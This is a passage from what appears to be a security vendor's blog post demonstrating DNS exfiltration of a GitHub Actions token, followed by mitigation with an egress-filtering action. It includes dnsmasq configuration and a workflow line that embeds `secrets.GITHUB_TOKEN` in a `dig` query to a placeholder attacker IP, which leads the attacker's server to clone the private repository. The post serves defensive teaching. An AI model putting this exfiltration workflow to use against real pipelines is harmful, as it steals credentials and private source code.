Upong receiving the DNS query, the values are extracted from the domain name in the DNS query and immediately the Github repository is cloned.</p><h3 class="text-2xl font-semibold text-gray-900 mt-8 mb-4">Configure dnsmasq</h3><p class="text-lg text-gray-700 leading-relaxed mb-6">The default DNS resolver on Ubuntu is systemd-resolved, but it lacks some features, like forwarding DNS queries to a different name server for a specific domain. We&#x27;ll replace our local DNS resolver with dnsmasq, which provides more flexibility. We&#x27;ll configure dnsmasq to use our custom DNS server for DNS queries to domain<!-- --> <code class="bg-gray-100 px-2 py-1 rounded">dnsx.github.com</code> <!-- -->and use 8.8.8.8 (Google&#x27;s DNS) for every other domains.</p><p class="text-lg text-gray-700 leading-relaxed mb-6">Open<!-- --> <code class="bg-gray-100 px-2 py-1 rounded">/etc/dnsmasq.conf</code> <!-- -->and set the following config:</p><pre style="color:#d4d4d4;font-size:0.875rem;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e;border-radius:0.5rem;margin-bottom:2rem"><code class="language-bash" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token assign-left" style="color:#9cdcfe">server</span><span class="token" style="color:#d4d4d4">=</span><span>/dnsx.github.com/127.0.0.1</span><span class="token" style="color:#6a9955">#5353</span><span>
</span><span></span><span class="token assign-left" style="color:#9cdcfe">server</span><span class="token" style="color:#d4d4d4">=</span><span>/</span><span class="token" style="color:#6a9955">#/8.8.8.8</span><span>
</span><span></span><span class="token assign-left" style="color:#9cdcfe">interface</span><span class="token" style="color:#d4d4d4">=</span><span>lo
</span><span></span><span class="token assign-left" style="color:#9cdcfe">interface</span><span class="token" style="color:#d4d4d4">=</span><span>ens5 </span><span class="token" style="color:#6a9955"># replace with your network interface that will receive public request</span></code></pre><p class="text-lg text-gray-700 leading-relaxed mb-6">The second<!-- --> <code class="bg-gray-100 px-2 py-1 rounded">interface</code> in the dnsmasq.conf file is important. You need to make sure the network interface which will receive DNS queries from the internet is added here. On AWS, the network interface is<!-- --> <code class="bg-gray-100 px-2 py-1 rounded">ens5</code>, but a common one is<!-- --> <code class="bg-gray-100 px-2 py-1 rounded">eth0</code>. You can get the default network interface with the following command:</p><pre style="color:#d4d4d4;font-size:0.875rem;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e;border-radius:0.5rem;margin-bottom:2rem"><code class="language-bash" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#dcdcaa">ip</span><span> route </span><span class="token" style="color:#d4d4d4">|</span><span> </span><span class="token" style="color:#dcdcaa">grep</span><span> default </span><span class="token" style="color:#d4d4d4">|</span><span> </span><span class="token" style="color:#dcdcaa">awk</span><span> </span><span class="token" style="color:#ce9178">&#x27;{print $5}&#x27;</span></code></pre><p class="text-lg text-gray-700 leading-relaxed mb-6">Now disable systemd-resolved and configure the system to use dnsmasq as the DNS resolver.</p><pre style="color:#d4d4d4;font-size:0.875rem;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e;border-radius:0.5rem;margin-bottom:2rem"><code class="language-bash" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#dcdcaa">sudo</span><span> systemctl disable </span><span class="token" style="color:#9cdcfe">--now</span><span> systemd-resolved</span></code></pre><p class="text-lg text-gray-700 leading-relaxed mb-6">Open<!-- --> <code class="bg-gray-100 px-2 py-1 rounded">/etc/resolv.conf</code> <!-- -->and set the following config:</p><pre style="color:#d4d4d4;font-size:0.875rem;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e;border-radius:0.5rem;margin-bottom:2rem"><code class="language-bash" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>nameserver </span><span class="token" style="color:#b5cea8">127.0</span><span>.0.1</span></code></pre><p class="text-lg text-gray-700 leading-relaxed mb-6">Finally, restart the dnsmasq service</p><pre style="color:#d4d4d4;font-size:0.875rem;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e;border-radius:0.5rem;margin-bottom:2rem"><code class="language-bash" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#dcdcaa">sudo</span><span> systemctl restart dnsmasq</span></code></pre><p class="text-lg text-gray-700 leading-relaxed mb-6">Confirm the setup by sending a DNS query to our default DNS server on port 53 (default port):</p><pre style="color:#d4d4d4;font-size:0.875rem;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e;border-radius:0.5rem;margin-bottom:2rem"><code class="language-bash" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#dcdcaa">dig</span><span> test.dnsx.github.com</span></code></pre><p class="text-lg text-gray-700 leading-relaxed mb-6">Again, the DNS response should be an A record with IP 10.0.0.1.</p><h3 class="text-2xl font-semibold text-gray-900 mt-8 mb-4">Test from the public internet</h3><p class="text-lg text-gray-700 leading-relaxed mb-6">The test above only verified that the DNS server is properly configured on the localhost. Let&#x27;s validate the setup is working fine when sending DNS queries from the public internet.</p><p class="text-lg text-gray-700 leading-relaxed mb-6">First, make sure the server has a public IP address and has opened the port 53.</p><p class="text-lg text-gray-700 leading-relaxed mb-6">On AWS, this can be done by adding the following inbound rules to the security group attached to the EC2 instance:</p><ul class="list-disc list-inside text-lg text-gray-700 leading-relaxed mb-6 space-y-2"><li>DNS (TCP), Port 53, Source 0.0.0.0/0</li><li>DNS (UDP), Port 53, Source 0.0.0.0/0</li></ul><p class="text-lg text-gray-700 leading-relaxed mb-6">Now, from another machine, send a DNS query to your DNS server public IP address:</p><pre style="color:#d4d4d4;font-size:0.875rem;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e;border-radius:0.5rem;margin-bottom:2rem"><code class="language-bash" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#dcdcaa">dig</span><span> @</span><span class="token" style="color:#d4d4d4">&lt;</span><span>PUBLIC_IP</span><span class="token" style="color:#d4d4d4">&gt;</span><span> test.dnsx.github.com</span></code></pre><p class="text-lg text-gray-700 leading-relaxed mb-6">Again, the DNS response should be an A record with IP 10.0.0.1.</p><h3 class="text-2xl font-semibold text-gray-900 mt-8 mb-4">Using the public internet DNS resolution</h3><p class="text-lg text-gray-700 leading-relaxed mb-6">Instead of specifying the custom DNS server IP address as the name server to use for the<!-- --> <code class="bg-gray-100 px-2 py-1 rounded">dig</code> command, you can also use a real domain that you own and configure the<!-- --> <code class="bg-gray-100 px-2 py-1 rounded">NS</code> record to point to your custom DNS server. Obviously, we won&#x27;t be able to use the domain<!-- --> <code class="bg-gray-100 px-2 py-1 rounded">dnsx.github.com</code> <!-- -->we&#x27;ve been using above, since we don&#x27;t control the github.com domain, so we would need to use a domain that we own and control the DNS records. For example, if you own the<!-- --> <code class="bg-gray-100 px-2 py-1 rounded">example.com</code> <!-- -->domain, you could configure the following DNS records in your domain DNS configuration (e.g. in AWS Route 53 or Cloudflare DNS):</p><ul class="list-disc list-inside text-lg text-gray-700 leading-relaxed mb-6 space-y-2"><li>Add an <code class="bg-gray-100 px-2 py-1 rounded">A</code> <!-- -->record for<!-- --> <code class="bg-gray-100 px-2 py-1 rounded">ns.example.com</code> <!-- -->that resolves to your custom DNS server public IP address</li><li>Add a <code class="bg-gray-100 px-2 py-1 rounded">NS</code> <!-- -->record for<!-- --> <code class="bg-gray-100 px-2 py-1 rounded">dnsx.example.com</code> <!-- -->with<!-- --> <code class="bg-gray-100 px-2 py-1 rounded">ns.example.com</code> <!-- -->as the value</li></ul><p class="text-lg text-gray-700 leading-relaxed mb-6">Now, from any machine, you can send a DNS query to your domain, without specifying the custom DNS server IP address, but still have it resolved by your custom DNS server:</p><pre style="color:#d4d4d4;font-size:0.875rem;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e;border-radius:0.5rem;margin-bottom:2rem"><code class="language-bash" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#dcdcaa">dig</span><span> test.dnsx.example.com</span></code></pre><p class="text-lg text-gray-700 leading-relaxed mb-6">Of course, you would also need to modify the dnsmasq configuration and the code of the custom DNS server to respond to your domain (e.g.<!-- --> <code class="bg-gray-100 px-2 py-1 rounded">dnxs.example.com</code> <!-- -->instead of<!-- --> <code class="bg-gray-100 px-2 py-1 rounded">dnsx.github.com</code>):</p><h2 class="text-3xl font-bold text-gray-900 mt-12 mb-6">Exfiltrating Github Token via DNS</h2><p class="text-lg text-gray-700 leading-relaxed mb-6">If you are familiar with Github Actions, you probably know that Github Actions workflows are running with a default Github token, which provides by default read permissions on the repository where the workflow is running, and can even have write permissions if the workflow is configured as such (or even run with Personal Access Token that a developer would have configured). Default workflow Github tokens are short-lived and will only live for the duration of the workflow.</p><p class="text-lg text-gray-700 leading-relaxed mb-6">For this proof-of-concept, we are particularly interested in private repositories. Malicious code which will exfiltrate data could be running from compromised third-party packages or Github Actions. For the purpose of this proof-of-concept, we&#x27;ll assume that a private repository is running a compromised third-party action, which is configured to use the default Github token as an input, making the Github token (with repo read access) available for the code running in the action.</p><p class="text-lg text-gray-700 leading-relaxed mb-6">To simplify this proof-of-concept, we&#x27;ll simply run the following workflow in the private repository that we are targeting, which will make a DNS query using<!-- --> <code class="bg-gray-100 px-2 py-1 rounded">dig</code>:</p><pre style="color:#d4d4d4;font-size:0.875rem;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e;border-radius:0.5rem;margin-bottom:2rem"><code class="language-yaml" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token key" style="color:#ce9178">name</span><span class="token" style="color:#d4d4d4">:</span><span> DNS Exfiltration
</span>
<span></span><span class="token key" style="color:#ce9178">on</span><span class="token" style="color:#d4d4d4">:</span><span>
</span><span>  </span><span class="token key" style="color:#ce9178">push</span><span class="token" style="color:#d4d4d4">:</span><span>
</span>
<span></span><span class="token key" style="color:#ce9178">jobs</span><span class="token" style="color:#d4d4d4">:</span><span>
</span><span>  </span><span class="token key" style="color:#ce9178">test</span><span class="token" style="color:#d4d4d4">:</span><span>
</span><span>    </span><span class="token key" style="color:#ce9178">runs-on</span><span class="token" style="color:#d4d4d4">:</span><span> ubuntu</span><span class="token" style="color:#d4d4d4">-</span><span>latest
</span><span>    </span><span class="token key" style="color:#ce9178">steps</span><span class="token" style="color:#d4d4d4">:</span><span>
</span><span>      </span><span class="token" style="color:#d4d4d4">-</span><span> </span><span class="token key" style="color:#ce9178">run</span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#d4d4d4">|</span><span class="token scalar" style="color:#ce9178">
</span><span class="token scalar" style="color:#ce9178">          repo=$(echo ${{ github.repository }}  | cut -d&#x27;/&#x27; -f2)
</span><span class="token scalar" style="color:#ce9178">          dig @&lt;PUBLIC_IP&gt; ${{ github.repository_owner}}.$repo.${{ secrets.GITHUB_TOKEN}}.dnsx.github.com</span></code></pre><p class="text-lg text-gray-700 leading-relaxed mb-6">Replace<!-- --> <code class="bg-gray-100 px-2 py-1 rounded">&lt;PUBLIC_IP&gt;</code> <!-- -->with the public IP address of your DNS server and run the workflow above. You should see the private repo being cloned on the server where the custom DNS server is running. A short-lived and ephemeral access token couldn&#x27;t prevent against DNS exfiltration.</p><h2 class="text-3xl font-bold text-gray-900 mt-12 mb-6">Protecting Against DNS Exfiltration</h2><p class="text-lg text-gray-700 leading-relaxed mb-6">Traditional security solutions that provide egress filtering will require you to allow or block specific IP addresses or IP ranges. Given the highly dynamic nature of IP addresses for most cloud services, this unfortunately doesn&#x27;t meet most teams and organizations needs. There are some more sophisticated security solutions that allow you to filter based on domain names. Unfortunately, some of them do not provide the necessary protection against DNS exfiltration. The problem is that they allow all DNS queries and only block traditional TCP/UDP connections to IP addresses of domains that are not allowed, but in the case of DNS exfiltration, the harm has already been done during the IP resolution.</p><p class="text-lg text-gray-700 leading-relaxed mb-6">Solutions like<!-- --> <a href="https://github.com/bullfrogsec/bullfrog" target="_blank" rel="noopener noreferrer" class="text-emerald-600 hover:text-emerald-700 underline">bullfrog</a> <!-- -->are purpose-built for providing egress filtering capabilities in Github Actions workflow and can effectively protect against DNS exfiltration. To block DNS exfiltration in our POC workflow, we add a step at the beginning of the job that use the<!-- --> <a href="https://github.com/bullfrogsec/bullfrog" target="_blank" rel="noopener noreferrer" class="text-emerald-600 hover:text-emerald-700 underline">bullfrog Github Action</a>:</p><pre style="color:#d4d4d4;font-size:0.875rem;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e;border-radius:0.5rem;margin-bottom:2rem"><code class="language-yaml" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token key" style="color:#ce9178">name</span><span class="token" style="color:#d4d4d4">:</span><span> DNS Exfiltration
</span>
<span></span><span class="token key" style="color:#ce9178">on</span><span class="token" style="color:#d4d4d4">:</span><span>
</span><span>  </span><span class="token key" style="color:#ce9178">push</span><span class="token" style="color:#d4d4d4">:</span><span>
</span>
<span></span><span class="token key" style="color:#ce9178">jobs</span><span class="token" style="color:#d4d4d4">:</span><span>
</span><span>  </span><span class="token key" style="color:#ce9178">test</span><span class="token" style="color:#d4d4d4">:</span><span>
</span><span>    </span><span class="token key" style="color:#ce9178">runs-on</span><span class="token" style="color:#d4d4d4">:</span><span> ubuntu</span><span class="token" style="color:#d4d4d4">-</span><span>latest
</span><span>    </span><span class="token key" style="color:#ce9178">steps</span><span class="token" style="color:#d4d4d4">:</span><span>
</span><span>      </span><span class="token" style="color:#d4d4d4">-</span><span> </span><span class="token key" style="color:#ce9178">name</span><span class="token" style="color:#d4d4d4">:</span><span> Egress filtering
</span><span>        </span><span class="token key" style="color:#ce9178">uses</span><span class="token" style="color:#d4d4d4">:</span><span> bullfrogsec/bullfrog@v0
</span><span>        </span><span class="token key" style="color:#ce9178">with</span><span class="token" style="color:#d4d4d4">:</span><span>
</span><span>          </span><span class="token key" style="color:#ce9178">egress-policy</span><span class="token" style="color:#d4d4d4">:</span><span> block
</span><span>          </span><span class="token key" style="color:#ce9178">allowed-domains</span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#d4d4d4">|</span><span class="token scalar" style="color:#ce9178">
</span><span class="token scalar" style="color:#ce9178">            *.github.com</span><span>
</span><span>      </span><span class="token" style="color:#d4d4d4">-</span><span> </span><span class="token key" style="color:#ce9178">run</span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#d4d4d4">|</span><span class="token scalar" style="color:#ce9178">
</span><span class="token scalar" style="color:#ce9178">          repo=$(echo ${{ github.repository }}  | cut -d&#x27;/&#x27; -f2)
</span><span class="token scalar" style="color:#ce9178">          dig @&lt;PUBLIC_IP&gt; ${{ github.repository_owner}}.$repo.${{ secrets.GITHUB_TOKEN}}.dnsx.github.com</span></code></pre><p class="text-lg text-gray-700 leading-relaxed mb-6">If you run the example workflow above, you should see the DNS query for the<!-- --> <code class="bg-gray-100 px-2 py-1 rounded">dnsx.github.com</code> <!-- -->domain being blocked (in the workflow annotations) and you won&#x27;t see the DNS query being received by your custom DNS server. Even with the<!-- --> <code class="bg-gray-100 px-2 py-1 rounded">*.github.com</code> <!-- -->domains being allowed in bullfrog, the query is blocked because the specified name server is not trusted.</p><img src="/blog/block-annotations.png" alt="Block annotations for DNS queries" class="w-full rounded-lg shadow-lg my-8"/><h2 class="text-3xl font-bold text-gray-900 mt-12 mb-6">Conclusion</h2><p class="text-lg text-gray-700 leading-relaxed mb-6">DNS exfiltration poses a significant threat to the security of private repositories, especially within automated CI/CD pipelines like GitHub Actions. This proof-of-concept underscores the importance of implementing robust security measures to prevent unauthorized access and data leakage. By leveraging<!-- --> <a href="https://github.com/bullfrogsec/bullfrog" target="_blank" rel="noopener noreferrer" class="text-emerald-600 hover:text-emerald-700 underline">egress filtering solutions</a> <!-- -->and staying vigilant about third-party dependencies, developers can mitigate the risks associated with DNS exfiltration.</p></article></main><footer class="bg-gray-900 text-gray-400 py-12 px-4 md:px-8"><div class="max-w-7xl mx-auto"><div class="grid grid-cols-2 sm:grid-cols-4 gap-6 sm:gap-8 mb-8"><div><div class="flex items-center gap-2 mb-4"><div class="w-8 h-8 bg-emerald-500 rounded-lg flex items-center justify-center"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-shield w-5 h-5 text-white"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path></svg></div><span class="text-white">Bullfrog Security</span></div><p class="text-sm">Securing CI/CD pipelines from supply chain attacks</p></div><div><h4 class="text-white mb-4">Product</h4><ul class="space-y-2 text-sm"><li><a class="hover:text-emerald-400" href="/#features" data-discover="true">Features</a></li><li><a class="hover:text-emerald-400" href="/#pricing" data-discover="true">Pricing</a></li><li><a href="https://docs.bullfrogsec.com" class="hover:text-emerald-400">Documentation</a></li></ul></div><div><h4 class="text-white mb-4">Legal</h4><ul class="space-y-2 text-sm"><li><a class="hover:text-emerald-400" href="/privacy" data-discover="true">Privacy Policy</a></li><li><a class="hover:text-emerald-400" href="/terms" data-discover="true">Terms of Service</a></li><li><a class="hover:text-emerald-400" href="/security" data-discover="true">Security</a></li></ul></div><div><h4 class="text-white mb-4">Community</h4><ul class="space-y-2 text-sm"><li><a class="hover:text-emerald-400" href="/blog" data-discover="true">Blog</a></li><li><a class="hover:text-emerald-400" href="https://github.com/bullfrogsec">Github</a></li><li><a class="hover:text-emerald-400" href="https://www.reddit.com/r/bullfrogsec">Reddit</a></li></ul></div></div><div class="border-t border-gray-800 pt-8 flex flex-row items-center justify-between gap-4"><p class="text-sm">Â© 2026 Bullfrog Security. All rights reserved.</p><div class="flex gap-4"><a href="https://github.com/bullfrogsec" class="hover:text-emerald-400" aria-label="GitHub"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 496 512" class="w-6 h-6" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg></a><a href="https://www.reddit.com/r/bullfrogsec" class="hover:text-emerald-400" aria-label="Reddit"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="w-6 h-6" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M201.5 305.5c-13.8 0-24.9-11.1-24.9-24.6 0-13.8 11.1-24.9 24.9-24.9 13.6 0 24.6 11.1 24.6 24.9 0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4 0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7 0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9 0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5 0 52.6 59.2 95.2 132 95.2 73.1 0 132.3-42.6 132.3-95.2 0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6 0-2.2-2.2-6.1-2.2-8.3 0-2.5 2.5-2.5 6.4 0 8.6 22.8 22.8 87.3 22.8 110.2 0 2.5-2.2 2.5-6.1 0-8.6-2.2-2.2-6.1-2.2-8.3 0zm7.7-75c-13.6 0-24.6 11.1-24.6 24.9 0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.1 24.9-24.6 0-13.8-11-24.9-24.9-24.9z"></path></svg></a></div></div></div></footer></div><script>((storageKey2, restoreKey) => {
    if (!window.history.state || !window.history.state.key) {
      let key = Math.random().toString(32).slice(2);
      window.history.replaceState({ key }, "");
    }
    try {
      let positions = JSON.parse(sessionStorage.getItem(storageKey2) || "{}");
